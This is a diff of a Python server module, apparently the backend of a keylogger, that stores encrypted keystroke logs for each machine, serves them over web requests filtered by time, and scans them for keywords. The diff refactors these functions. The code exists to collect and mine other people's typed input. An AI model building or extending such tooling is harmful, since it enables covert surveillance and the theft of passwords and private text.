@@ -76,26 +76,12 @@ def delete_notification(notification_id):
     with open(file_path, "w", encoding="utf-8") as f:
         json.dump(alerts, f, ensure_ascii=False, indent=2)
 
-def get_warnings():
-    arr_notifications = get_notifications()
-    key_of_notification = []
-    data = {}
-    for notification in arr_notifications:
-        notice = json.loads(notification)
-        key_of_notification.append(notice.get("keywords"))
-
-    arr_machine = get_machines_list()
-    for machine in arr_machine:
-        res_find_notice = find_warnings_in_data(machine, key_of_notification)
-        if res_find_notice:
-            data.setdefault(machine, []).append(res_find_notice)
-    return data
-
 def save_keystrokes(data):
     enc = Encryptor()
     data = enc.encrypt_dict(data)
     machine = next(iter(data))
     payload = data.pop(machine)
+
     folder = os.path.join(LOG_DIR, machine)
     os.makedirs(folder, exist_ok=True)
     path = os.path.join(folder, f"{datetime.now():%Y-%m-%d_%H}.json")
@@ -117,31 +103,65 @@ def save_keystrokes(data):
 def get_machines_list():
     return os.listdir(LOG_DIR) if os.path.exists(LOG_DIR) else []
 
-def find_warnings_in_data(machine, warnings):
+def get_all_warnings():
+    arr_notifications = get_notifications()
+    key_of_notification = []
     data = {}
+    for notification in arr_notifications:
+        notice = json.loads(notification)
+        keywords = notice.get("keywords", [])
+        if isinstance(keywords, list):
+            key_of_notification.extend(keywords)
+        elif isinstance(keywords, str):
+            key_of_notification.append(keywords)
+
+    arr_machine = get_machines_list()
+    for machine in arr_machine:
+        res_find_notice = find_warnings_in_data(machine, key_of_notification)
+        if res_find_notice:
+            data.setdefault(machine, []).append(res_find_notice)
+    return data
+
+def find_warnings(data, file_name, warnings):
+    alerts = {}
+    for k, v in data.items():
+        if isinstance(v, dict):
+            for k_k, v_v in v.items():
+                fields = (k, k_k, v_v)
+                for f in fields:
+                    if any(w in f for w in warnings):
+                        alerts.setdefault(file_name, {}).setdefault(k, {}).setdefault(k_k, v_v)
+
+    return alerts
+
+def find_warnings_in_data(machine, warnings):
     folder = os.path.join(LOG_DIR, machine)
+    alerts = {}
     for filename in os.listdir(folder):
-        file_n = filename[:-8]
+        file_name = filename[:-8]
         full_path = os.path.join(folder, filename)
         with open(full_path, "r", encoding="utf-8") as f:
             file_content = json.load(f)
-            for k,v in file_content.items():
+            for k, v in file_content.items():
                 if isinstance(v, dict):
-                    for k_k , v_v in v.items():
-                        if any(k in w or k_k in w or v_v in w for w in warnings):
-                            data.setdefault(file_n, {}).setdefault(k, {}).setdefault(k_k, v_v)
-    if data:
-        return data
+                    for k_k, v_v in v.items():
+                        fields = (k, k_k, v_v)
+                        for f in fields:
+                            if any(w in f for w in warnings):
+                                alerts.setdefault(file_name, {}).setdefault(k, {}).setdefault(k_k, v_v)
+    if alerts:
+        return alerts
     return None
 
-def get_all_keystrokes(machine):
+def get_all_keystrokes():
     data = {}
-    folder = os.path.join(LOG_DIR, machine)
-    for filename in os.listdir(folder):
-        full_path = os.path.join(folder, filename)
-        with open(full_path, "r", encoding="utf-8") as f:
-            file_n = filename[:-8]
-            data[file_n] = json.load(f)
+    for machine in os.listdir(LOG_DIR):
+        folder = os.path.join(LOG_DIR, machine)
+        for filename in os.listdir(folder):
+            full_path = os.path.join(folder, filename)
+            with open(full_path, "r", encoding="utf-8") as f:
+                file_n = filename[:-8]
+                data[file_n] = json.load(f)
     if data:
         return data
     return None
@@ -154,18 +174,21 @@ def get_keystrokes(request):
     date_str = request.args.get("date")
     start_t = ptime(request.args.get("start")) or dtime(0,0,0)
     end_t   = ptime(request.args.get("end"))   or dtime(23,59,59)
-    if start_t > end_t: start_t, end_t = end_t, start_t
+    if start_t > end_t:
+        start_t, end_t = end_t, start_t
 
     folder = os.path.join(LOG_DIR, machine)
-    if not os.path.isdir(folder): return jsonify([])
+    if not os.path.isdir(folder):
+        return jsonify({})
 
     files = [f for f in os.listdir(folder) if f.endswith(".json")]
-    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
+    if date_str:
+        files = [f for f in files if f.startswith(f"{date_str}_")]
     sh, eh = start_t.hour, end_t.hour
     files = [f for f in files if ((h:=hour_from_fname(f)) is not None and sh <= h <= eh)]
     files.sort()
 
-    out = []
+    result = {}
     for f in files:
         p = os.path.join(folder, f)
         try:
@@ -173,17 +196,20 @@ def get_keystrokes(request):
                 obj = json.load(fh)
         except Exception:
             with open(p, "r", encoding="utf-8") as fh:
-                out.append(fh.read())
+                result.setdefault(f.split("_")[0], []).append(fh.read())
             continue
 
         if not isinstance(obj, dict):
-            out.append(json.dumps(obj, ensure_ascii=False))
+            result.setdefault(f.split("_")[0], []).append(json.dumps(obj, ensure_ascii=False))
             continue
 
         filtered = {k:v for k,v in obj.items()
                     if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
         if filtered:
-            out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
-    return out
+            result.setdefault(f.split("_")[0], []).append(
+                json.dumps(filtered, ensure_ascii=False, indent=2)
+            )
 
-print(get_warnings())
+    return jsonify(result)
+
+print(get_all_warnings())
